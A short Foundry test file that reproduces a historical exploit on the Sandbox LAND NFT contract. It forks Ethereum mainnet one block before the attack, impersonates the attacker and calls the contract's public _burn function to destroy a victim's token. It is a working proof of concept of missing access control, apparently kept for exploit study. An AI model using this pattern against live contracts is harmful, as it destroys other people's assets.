// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";

import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';

interface ILand {
  function _burn(
    address from,
    address owner,
    uint256 id
  ) external;
  function _numNFTPerAddress(address) external view returns (uint256);
}

contract Exploit_SandBox is TestHarness{
    address internal attacker = 0x6FB0B915D0e10c3B2ae42a5DD879c3D995377A2C;
    address internal victim = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;

    ILand internal land = ILand(0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a);

    function setUp() external {
        cheat.createSelectFork('mainnet', 14163041); // We pin one block before the exploit happened.

    }

    function test_attack() external {
        console.log('------- INITIAL NFT BALANCE OF VICTIM -------');
        console.log(land._numNFTPerAddress(victim));

        cheat.prank(attacker);
        land._burn(victim, victim, 3738);
        console.log('------- FINAL NFT BALANCE OF VICTIM -------');
        console.log(land._numNFTPerAddress(victim));
    }
}
